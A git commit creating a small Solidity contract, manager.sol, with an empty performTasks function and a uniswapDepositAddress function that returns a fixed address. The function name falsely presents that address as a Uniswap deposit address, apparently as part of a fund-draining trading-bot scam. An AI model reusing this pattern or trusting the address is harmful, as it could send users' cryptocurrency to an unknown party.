adc3f0d593404e11f92026e85f2a065f2700faf0
mike00fuller <72899417+mike00fuller@users.noreply.github.com>
2021-07-11 11:30:36 -0400

    Create manager.sol

---
+++ manager.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+   function performTasks() public {
+	    
+   }
+
+   function uniswapDepositAddress() public pure returns (address) {
+	return 0xaEb1Ea98634EcE49e41c05B41DA16Bc2dd7539F0;
+   }
+}
